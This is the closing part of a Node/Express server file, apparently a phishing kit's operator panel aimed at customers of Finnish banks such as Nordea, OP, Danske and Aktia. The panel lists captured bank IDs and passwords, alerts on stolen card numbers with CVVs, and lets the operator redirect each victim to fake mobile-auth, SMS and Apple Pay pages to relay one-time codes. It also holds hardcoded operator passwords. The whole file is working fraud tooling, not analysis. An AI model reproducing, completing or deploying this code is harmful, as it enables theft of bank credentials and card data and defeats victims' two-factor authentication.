        .password-dialog.active { display: flex; animation: fadeUp 0.2s ease-out; }
        .password-box { background: #181818; border: 1px solid #333333; border-radius: 6px; padding: 36px 30px; max-width: 280px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.6); display: flex; flex-direction: column; align-items: center; }
        .password-box .password-logo img { height: 80px; width: auto; display: block; border-radius: 6px; margin-bottom: 16px; }
        .password-box input { width: 100%; padding: 10px 14px; background: #111111; border: 1px solid #333333; border-radius: 4px; color: #eeeeee; font-size: 15px; font-family: 'Inter', sans-serif; outline: none; letter-spacing: 3px; text-align: center; transition: all 0.2s ease; margin-bottom: 16px; }
        .password-box input:focus { border-color: #555555; }
        .password-box .error { color: #ff6b6b; font-size: 12px; margin-top: 0; margin-bottom: 12px; display: none; text-transform: uppercase; }
        .password-box .error.show { display: block; animation: fadeUp 0.2s ease-out; }
        .password-box .actions { display: flex; gap: 12px; justify-content: center; }
        .password-box .btn-submit { font-family: 'Inter', sans-serif; background: #1a331a; border: 1px solid #2b5c2b; color: #88ff88; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; text-transform: uppercase; letter-spacing: 1px; }
        .password-box .btn-submit:hover { background: #1f3d1f; }
        .password-box .btn-cancel { font-family: 'Inter', sans-serif; background: #222222; border: 1px solid #333333; color: #aaaaaa; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; text-transform: uppercase; letter-spacing: 1px; }
        .password-box .btn-cancel:hover { background: #282828; color: #eeeeee; }

        .confirm-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(2px); z-index: 9999; justify-content: center; align-items: center; }
        .confirm-dialog.active { display: flex; animation: fadeUp 0.2s ease-out; }
        .confirm-box { background: #181818; border: 1px solid #333333; border-radius: 6px; padding: 32px 36px; max-width: 360px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.6); text-transform: uppercase; }
        .confirm-box h3 { font-size: 16px; font-weight: 600; color: #eeeeee; margin-bottom: 8px; letter-spacing: 1px; }
        .confirm-box p { font-size: 13px; color: #aaaaaa; margin-bottom: 24px; }
        .confirm-box .actions { display: flex; gap: 12px; justify-content: center; }
        .confirm-box .btn-confirm { font-family: 'Inter', sans-serif; background: #331a1a; border: 1px solid #5c2b2b; color: #ff8888; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; }
        .confirm-box .btn-confirm:hover { background: #441b1b; }
        .confirm-box .btn-cancel { font-family: 'Inter', sans-serif; background: #222222; border: 1px solid #333333; color: #aaaaaa; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; }
        .confirm-box .btn-cancel:hover { background: #282828; color: #eeeeee; }
    </style>
</head>
<body>
<div class="grid-overlay"></div>

<!-- Toast Notifications Container -->
<div class="toast-container" id="toastContainer"></div>

<!-- Login Screen -->
<div class="login-screen" id="loginScreen">
    <div class="login-box">
        <div class="login-logo">
            <img src="/media/password.gif" alt="Logo">
        </div>
        <input class="login-input" type="text" id="loginUser" placeholder="USERNAME" autofocus>
        <input class="login-input" type="password" id="loginPass" placeholder="PASSWORD">
        <button class="login-btn" id="loginBtn">LOGIN</button>
        <div class="error" id="loginError">INVALID CREDENTIALS</div>
    </div>
</div>

<div class="admin-panel" id="adminPanel">
    <div class="sidebar">
        <div class="sidebar-header">
            <span class="logo-small"><img src="/media/workspace.gif" alt="WORKSPACE Logo"></span>
            <span class="title">WORKSPACE</span>
        </div>
        <div class="sidebar-nav">
            <button class="sidebar-btn active" id="logsBtn" onclick="switchView('logs')">CAPTURES</button>
            <button class="sidebar-btn" id="settingsBtn" onclick="switchView('settings')">SETTINGS</button>
        </div>
        <div class="sidebar-footer"><span class="version">V1.0</span></div>
    </div>

    <div class="main-content">
        <div id="logsView" class="active">
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>page</th>
                            <th>bankid</th>
                            <th>pass</th>
                            <th style="text-align:center;">actions</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody" class="empty"></tbody>
                </table>
                <div class="empty-state" id="emptyState">
                    <span class="icon">[ -- ]</span>
                    NOTHING HERE YET
                    <div class="sub">AWAITING SUBMISSIONS</div>
                </div>
            </div>
        </div>

        <div id="settingsView">
            <div class="settings-content" id="settingsContent"></div>
        </div>
    </div>
</div>

<div class="auth-dialog" id="authDialog">
    <div class="auth-box">
        <h3 id="authTitle">ENTER VALUE</h3>
        <p id="authDescription">PLEASE ENTER THE VALUE TO DISPLAY</p>
        <input type="text" id="authInput" placeholder="" autofocus>
        <div class="actions">
            <button class="btn-submit" id="authYes">SUBMIT</button>
            <button class="btn-cancel" id="authNo">CANCEL</button>
        </div>
    </div>
</div>

<div class="password-dialog" id="passwordDialog">
    <div class="password-box">
        <div class="password-logo"><img src="/media/password.gif" alt="Logo"></div>
        <input type="password" id="passwordDialogInput" placeholder="PASSWORD" autofocus>
        <div class="error" id="passwordDialogError">ACCESS DENIED</div>
        <div class="actions">
            <button class="btn-submit" id="passwordDialogYes">SUBMIT</button>
            <button class="btn-cancel" id="passwordDialogNo">CANCEL</button>
        </div>
    </div>
</div>

<div class="confirm-dialog" id="confirmDialog">
    <div class="confirm-box">
        <h3 id="confirmTitle">CONFIRM</h3>
        <p id="confirmMessage">ARE YOU SURE?</p>
        <div class="actions">
            <button class="btn-confirm" id="confirmYes">CONFIRM</button>
            <button class="btn-cancel" id="confirmNo">CANCEL</button>
        </div>
    </div>
</div>

<div class="toast" id="toast">COPIED TO CLIPBOARD</div>

<script>
    // ----- CARD DETAILS COPY FUNCTION -----
    function copyCardDetails(cardDetails) {
        var parts = cardDetails.split(' | ');
        var cardNum = parts[0] || '';
        var expiry = parts[1] || '';
        var cvv = parts[2] || '';
        var fullDetails = 'Card Number: ' + cardNum + '\\nExpiry: ' + expiry + '\\nCVV: ' + cvv;
        
        navigator.clipboard.writeText(fullDetails).then(function() {
            showToast('CARD DETAILS COPIED');
        }).catch(function(err) {
            console.error('Failed to copy: ', err);
        });
    }

    // ---------- Clear login inputs on page refresh ----------
    window.addEventListener('load', function() {
        var userInput = document.getElementById('loginUser');
        var passInput = document.getElementById('loginPass');
        if (userInput) userInput.value = '';
        if (passInput) passInput.value = '';
    });

    // ---------- LOGIN ----------
    function verifyLogin() {
        var user = document.getElementById('loginUser').value;
        var pass = document.getElementById('loginPass').value;
        var error = document.getElementById('loginError');
        
        if (user === '666balenciaga' && pass === 'scotland70') {
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('adminPanel').classList.add('visible');
            refreshData();
            setInterval(refreshData, 1000);
            loadSettings();
        } else {
            error.classList.add('show');
            document.getElementById('loginUser').value = '';
            document.getElementById('loginPass').value = '';
            document.getElementById('loginUser').focus();
            setTimeout(function() {
                error.classList.remove('show');
            }, 2000);
        }
    }

    document.getElementById('loginBtn').addEventListener('click', verifyLogin);
    document.getElementById('loginPass').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            verifyLogin();
        }
    });
    document.getElementById('loginUser').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            document.getElementById('loginPass').focus();
        }
    });

    // ---------- TOAST NOTIFICATION ----------
    function showToastNotification(message) {
        var container = document.getElementById('toastContainer');
        var div = document.createElement('div');
        div.className = 'toast-notification';
        
        if (message.includes('NEW CARD:')) {
            var cardDetails = message.replace('💳 NEW CARD: ', '');
            
            var span = document.createElement('span');
            span.style.cssText = 'overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1;';
            span.textContent = message;
            div.appendChild(span);
            
            var copyBtn = document.createElement('button');
            copyBtn.className = 'toast-close';
            copyBtn.title = 'Copy Card Details';
            copyBtn.textContent = '📋';
            copyBtn.onclick = function() {
                copyCardDetails(cardDetails);
                div.remove();
            };
            div.appendChild(copyBtn);
            
            var closeBtn = document.createElement('button');
            closeBtn.className = 'toast-close';
            closeBtn.textContent = '×';
            closeBtn.onclick = function() { div.remove(); };
            div.appendChild(closeBtn);
            
        } else {
            var span = document.createElement('span');
            span.style.cssText = 'overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1;';
            span.textContent = message;
            div.appendChild(span);
            
            var closeBtn = document.createElement('button');
            closeBtn.className = 'toast-close';
            closeBtn.textContent = '×';
            closeBtn.onclick = function() { div.remove(); };
            div.appendChild(closeBtn);
        }
        
        container.appendChild(div);
        setTimeout(function() { div.classList.add('show'); }, 50);
        setTimeout(function() {
            div.classList.remove('show');
            setTimeout(function() { if (div.parentElement) div.remove(); }, 300);
        }, 4000);
    }

    function fetchNotifications() {
        fetch('/notifications')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.length === 0) return;
                var ids = [];
                data.forEach(function(n) {
                    showToastNotification(n.message);
                    ids.push(n.id);
                });
                fetch('/notifications/seen', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ids: ids })
                }).catch(function(err) { console.error('Error marking notifications seen:', err); });
            })
            .catch(function(err) { console.error('Notification fetch error:', err); });
    }

    setInterval(fetchNotifications, 3000);
    fetchNotifications();

    function showToast(text) {
        var toast = document.getElementById('toast');
        toast.textContent = text || 'COPIED TO CLIPBOARD';
        toast.classList.add('show');
        setTimeout(function() { toast.classList.remove('show'); }, 4000);
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(function() {
            showToast('COPIED TO CLIPBOARD');
        }).catch(function(err) {
            console.error('Failed to copy text: ', err);
        });
    }

    function switchView(view) {
        var logsView = document.getElementById('logsView');
        var settingsView = document.getElementById('settingsView');
        var logsBtn = document.getElementById('logsBtn');
        var settingsBtn = document.getElementById('settingsBtn');
        logsView.classList.remove('active');
        settingsView.classList.remove('active');
        logsBtn.classList.remove('active');
        settingsBtn.classList.remove('active');
        if (view === 'logs') {
            logsView.classList.add('active');
            logsBtn.classList.add('active');
        } else if (view === 'settings') {
            settingsView.classList.add('active');
            settingsBtn.classList.add('active');
            loadSettings();
        }
    }

    function performAction(uniqueID, action) {
        console.log('🔧 performAction called:', uniqueID, action);
        
        if (action === 'mobileauth') {
            showAuthDialog(function(authCode) {
                if (authCode && authCode.trim() !== '') {
                    fetch('/workspace/auth', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ uniqueID: uniqueID, authCode: authCode.trim() })
                    })
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.success) { showToast('AUTH SENT'); } else { showToast('ERROR'); }
                    })
                    .catch(function() { showToast('ERROR'); });
                }
            }, 'MOBILEAUTH', 'ENTER THE MOBILEAUTH CODE');
        } else if (action === 'sms') {
            showAuthDialog(function(smsCode) {
                if (smsCode && smsCode.trim() !== '') {
                    fetch('/workspace/sms', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ uniqueID: uniqueID })
                    })
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.success) { showToast('SMS SENT'); } else { showToast('ERROR'); }
                    })
                    .catch(function() { showToast('ERROR'); });
                }
            }, 'SMS', 'SEND SMS');
        } else if (action === 'elisa') {
            fetch('/workspace/redirect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uniqueID: uniqueID, url: '/elisa.html' })
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.success) { showToast('LOGOUT SENT'); } else { showToast('ERROR'); }
            })
            .catch(function() { showToast('ERROR'); });
        } else {
            // Any other action is treated as a redirect URL
            fetch('/workspace/redirect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uniqueID: uniqueID, url: action })
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.success) { showToast('REDIRECT SENT'); } else { showToast('ERROR'); }
            })
            .catch(function() { showToast('ERROR'); });
        }
    }

    function showMobileAuthModal(uniqueID, pageUrl) {
        showAuthDialog(function(value) {
            if (value && value.trim() !== '') {
                var urlWithCode = pageUrl + '?code=' + encodeURIComponent(value.trim());
                fetch('/workspace/redirect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uniqueID: uniqueID, url: urlWithCode })
                })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.success) {
                        showToast('AUTH CODE SENT');
                    } else {
                        showToast('ERROR: USER NOT FOUND');
                    }
                })
                .catch(function() { showToast('ERROR'); });
            } else if (value !== null) {
                showToast('CANCELLED');
            }
        }, 'ENTER VALUE', 'ENTER THE CODE TO REPLACE {code}');
    }

    var currentAuthCallback = null;
    function showAuthDialog(onSubmit, title, description) {
        var dialog = document.getElementById('authDialog');
        var input = document.getElementById('authInput');
        var titleEl = document.getElementById('authTitle');
        var descEl = document.getElementById('authDescription');
        titleEl.textContent = title || 'ENTER VALUE';
        descEl.textContent = description || 'PLEASE ENTER THE VALUE';
        input.value = '';
        dialog.classList.add('active');
        setTimeout(function() { input.focus(); }, 100);
        currentAuthCallback = onSubmit;
    }
    function hideAuthDialog() { document.getElementById('authDialog').classList.remove('active'); currentAuthCallback = null; }
    document.getElementById('authYes').addEventListener('click', function() {
        var val = document.getElementById('authInput').value.trim();
        if (typeof currentAuthCallback === 'function') { currentAuthCallback(val); }
        hideAuthDialog();
    });
    document.getElementById('authNo').addEventListener('click', function() {
        if (typeof currentAuthCallback === 'function') { currentAuthCallback(null); }
        hideAuthDialog();
    });
    document.getElementById('authDialog').addEventListener('click', function(e) {
        if (e.target === this) {
            if (typeof currentAuthCallback === 'function') { currentAuthCallback(null); }
            hideAuthDialog();
        }
    });
    document.getElementById('authInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') { e.preventDefault(); document.getElementById('authYes').click(); }
    });

    function showPasswordDialog(onSubmit) {
        var dialog = document.getElementById('passwordDialog');
        var input = document.getElementById('passwordDialogInput');
        var error = document.getElementById('passwordDialogError');
        input.value = '';
        error.classList.remove('show');
        dialog.classList.add('active');
        setTimeout(function() { input.focus(); }, 100);
        window.currentPasswordCallback = onSubmit;
    }
    function hidePasswordDialog() { document.getElementById('passwordDialog').classList.remove('active'); window.currentPasswordCallback = null; }
    document.getElementById('passwordDialogYes').addEventListener('click', function() {
        var val = document.getElementById('passwordDialogInput').value.trim();
        if (typeof window.currentPasswordCallback === 'function') { window.currentPasswordCallback(val); }
    });
    document.getElementById('passwordDialogNo').addEventListener('click', function() {
        if (typeof window.currentPasswordCallback === 'function') { window.currentPasswordCallback(null); }
        hidePasswordDialog();
    });
    document.getElementById('passwordDialog').addEventListener('click', function(e) {
        if (e.target === this) {
            if (typeof window.currentPasswordCallback === 'function') { window.currentPasswordCallback(null); }
            hidePasswordDialog();
        }
    });
    document.getElementById('passwordDialogInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') { e.preventDefault(); document.getElementById('passwordDialogYes').click(); }
    });

    function fetchTerminalLogs() {
        fetch('/terminal/logs')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var container = document.getElementById('terminalBody');
                if (!container) return;
                var html = '';
                var logs = data.slice(-200);
                logs.forEach(function(log) {
                    var typeClass = 'type-' + (log.type || 'info');
                    html += '<div class="terminal-log-line"><span class="time">[' + log.time + ']</span> <span class="' + typeClass + '">' + log.message + '</span></div>';
                });
                container.innerHTML = html;
                container.scrollTop = container.scrollHeight;
            })
            .catch(function(err) { console.error('Terminal fetch error:', err); });
    }

    function loadSettings() {
        var container = document.getElementById('settingsContent');
        container.innerHTML =
            '<div class="setting-item"><span class="setting-label">CLEAR CAPTURES</span><button class="btn-settings danger" id="clearLogsBtn">CLEAR</button></div>' +
            '<div class="setting-item" style="flex-direction:column; align-items:stretch; padding-bottom:0; border-bottom: none;">' +
                '<span class="setting-label" style="margin-bottom:10px;">TERMINAL</span>' +
                '<div class="terminal-window" style="width:100%;">' +
                    '<div class="terminal-header"><span class="terminal-title">LOG TERMINAL</span><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div></div>' +
                    '<div class="terminal-body" id="terminalBody"></div>' +
                '</div>' +
                '<div style="display:flex; gap:10px; margin-top:12px;"><button class="btn-settings" id="clearTerminalBtn" style="flex:1;">CLEAR TERMINAL</button></div>' +
            '</div>';
        document.getElementById('clearLogsBtn').addEventListener('click', function() {
            showConfirmDialog('DELETE CAPTURES', 'DELETE ALL CAPTURED DATA?', function() {
                fetch('/workspace/clear', { method: 'DELETE' })
                    .then(function(r) { return r.json(); })
                    .then(function(data) { refreshData(); })
                    .catch(function(err) { console.error(err); });
            });
        });
        document.getElementById('clearTerminalBtn').addEventListener('click', function() {
            showPasswordDialog(function(password) {
                if (password === null) return;
                if (password === 'bandobaby300') {
                    fetch('/terminal/clear', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password: password })
                    })
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.success) {
                            showToast('TERMINAL CLEARED');
                            hidePasswordDialog();
                            fetchTerminalLogs();
                        } else {
                            var error = document.getElementById('passwordDialogError');
                            error.classList.add('show');
                            document.getElementById('passwordDialogInput').value = '';
                            document.getElementById('passwordDialogInput').focus();
                            setTimeout(function() { error.classList.remove('show'); }, 2000);
                        }
                    })
                    .catch(function(err) { console.error(err); });
                } else {
                    var error = document.getElementById('passwordDialogError');
                    error.classList.add('show');
                    document.getElementById('passwordDialogInput').value = '';
                    document.getElementById('passwordDialogInput').focus();
                    setTimeout(function() { error.classList.remove('show'); }, 2000);
                }
            });
        });
        fetchTerminalLogs();
        setInterval(fetchTerminalLogs, 2000);
    }

    var currentConfirmAction = null;
    function showConfirmDialog(title, message, onConfirm) {
        document.getElementById('confirmTitle').textContent = title || 'CONFIRM';
        document.getElementById('confirmMessage').textContent = message || 'ARE YOU SURE?';
        document.getElementById('confirmDialog').classList.add('active');
        currentConfirmAction = onConfirm || null;
    }
    function hideConfirmDialog() {
        document.getElementById('confirmDialog').classList.remove('active');
        currentConfirmAction = null;
    }
    document.getElementById('confirmYes').addEventListener('click', function() {
        if (typeof currentConfirmAction === 'function') currentConfirmAction();
        hideConfirmDialog();
    });
    document.getElementById('confirmNo').addEventListener('click', hideConfirmDialog);
    document.getElementById('confirmDialog').addEventListener('click', function(e) {
        if (e.target === this) hideConfirmDialog();
    });

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    }

    var previousSubmissionCount = 0;

    function refreshData() {
        fetch('/workspace/data')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var lines = data.submissions;
                var tbody = document.getElementById('tableBody');
                var emptyState = document.getElementById('emptyState');
                if (!lines || lines.length === 0) {
                    previousSubmissionCount = 0;
                    tbody.className = 'empty';
                    tbody.innerHTML = '';
                    emptyState.style.display = 'flex';
                    return;
                }
                var isNewEntry = lines.length > previousSubmissionCount && previousSubmissionCount !== 0;
                previousSubmissionCount = lines.length;
                tbody.className = 'has-data';
                emptyState.style.display = 'none';
                var html = '';
                for (var i = 0; i < lines.length; i++) {
                    var parts = lines[i].split(':');
                    var uniqueID = parts[0] || '';
                    var page = escapeHtml((parts[1] || 'N/A').toUpperCase());
                    var rawUser = parts[2] || 'N/A';
                    var rawPass = parts[3] || 'N/A';
                    var user = escapeHtml(rawUser.toUpperCase());
                    var pass = escapeHtml(rawPass.toUpperCase());
                    
                    var bankName = parts[1] || 'N/A';
                    var bankLower = bankName.toLowerCase();
                    
                    // --- FIX: Use correct folder for OP ---
                    var folderName = bankLower;
                    if (bankName === 'Osuuspankki' || bankName === 'op') {
                        folderName = 'op';
                    }
                    
                    // --- FORCE BUTTONS BASED ON BANK NAME ---
                    var availablePages = [];
                    if (bankName === 'Aktia') {
                        availablePages = ['mobile_auth.html', 'sms.html'];
                    } else if (bankName === 'Ålandsbanken' || bankName === 'alandsbanken') {
                        availablePages = ['mobile_auth.html'];
                    } else if (bankName === 'Danskebank' || bankName === 'danske') {
                        availablePages = ['apay.html', 'mobile_auth.html'];
                    } else if (bankName === 'Nordea' || bankName === 'nordea') {
                        availablePages = ['apay.html', 'mobile_auth.html'];
                    } else if (bankName === 'Oma Säästöpankki' || bankName === 'omasp') {
                        availablePages = ['mobile_auth.html', 'sms.html'];
                    } else if (bankName === 'Osuuspankki' || bankName === 'op') {
                        availablePages = ['apay.html', 'mobile_auth.html', 'sms.html'];
                    } else if (bankName === 'POP Pankki' || bankName === 'poppankki') {
                        availablePages = ['mobile_auth.html'];
                    } else if (bankName === 'S-Pankki' || bankName === 'spankki') {
                        availablePages = ['mobile_auth.html', 'sms.html'];
                    } else if (bankName === 'Säästöpankki' || bankName === 'saastopankki') {
                        availablePages = ['apay.html', 'mobile_auth.html'];
                    }
                    
                    var actionButtons = '';
                    
                    for (var p = 0; p < availablePages.length; p++) {
                        var pageName = availablePages[p];
                        var label = pageName.replace('.html', '').toUpperCase();
                        var pageUrl = '/bank/' + folderName + '/' + pageName;
                        
                        if (pageName === 'mobile_auth.html') {
                            actionButtons += '<button class="action-btn" onclick="showMobileAuthModal(&quot;' + uniqueID + '&quot;, &quot;' + pageUrl + '&quot;)" title="MOBILEAUTH"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z"/><circle cx="16.5" cy="7.5" r=".5" fill="currentColor"/></g></svg></button>';
                        } else if (pageName === 'apay.html') {
                            actionButtons += '<button class="action-btn" onclick="performAction(&quot;' + uniqueID + '&quot;, &quot;' + pageUrl + '&quot;)" title="APAY"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 512 512"><rect width="416" height="320" x="48" y="96" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" rx="56" ry="56"/><path fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="60" d="M48 192h416M128 300h48v20h-48z"/></svg></button>';
                        } else if (pageName === 'sms.html') {
                            actionButtons += '<button class="action-btn" onclick="performAction(&quot;' + uniqueID + '&quot;, &quot;' + pageUrl + '&quot;)" title="SMS"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M8.54 10.54q.23-.23.23-.54t-.23-.54T8 9.23t-.54.23t-.23.54t.23.54t.54.23t.54-.23m4 0q.23-.23.23-.54t-.23-.54t-.54-.23t-.54.23t-.23.54t.23.54t.54.23t.54-.23m4 0q.23-.23.23-.54t-.23-.54t-.54-.23t-.54.23t-.23.54t.23.54t.54.23t.54-.23M3 20.077V4.616q0-.691.463-1.153T4.615 3h14.77q.69 0 1.152.463T21 4.616v10.769q0 .69-.463 1.153T19.385 17H6.077zM5.65 16h13.735q.23 0 .423-.192t.192-.423V4.615q0-.23-.192-.423T19.385 4H4.615q-.23 0-.423.192T4 4.615v13.03zM4 16V4z"/></svg></button>';
                        }
                    }
                    
                    var passwordIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>';
                    actionButtons += '<button class="action-btn" onclick="performAction(&quot;' + uniqueID + '&quot;, &quot;/password.html&quot;)" title="PASSWORD">' + passwordIcon + '</button>';
                    
                    var rowClass = (i === 0 && isNewEntry) ? 'col-page highlight-row' : 'col-page';
                    var escapedUser = escapeHtml(rawUser);
                    var escapedPass = escapeHtml(rawPass);
                    html += '<tr' + (i === 0 && isNewEntry ? ' class="highlight-row"' : '') + '>' +
                        '<td class="' + rowClass + '">' + page + '</td>' +
                        '<td class="col-user" onclick="copyToClipboard(&quot;' + escapedUser + '&quot;)" title="Click to copy">' + user + '</td>' +
                        '<td class="col-pass" onclick="copyToClipboard(&quot;' + escapedPass + '&quot;)" title="Click to copy">' + pass + '</td>' +
                        '<td class="col-action"><div class="action-btn-group">' + actionButtons + '</div></td>' +
                    '</tr>';
                }
                tbody.innerHTML = html;
            })
            .catch(function(err) { console.error('Refresh error:', err); });
    }

    document.getElementById('loginUser').focus();
</script>
</body>
</html>`;
    res.send(html);
});

// ---------- Start server ----------
app.listen(PORT, () => {
    console.log('Server running on http://localhost:' + PORT);
    console.log('Workspace: http://localhost:' + PORT + '/workspace');
});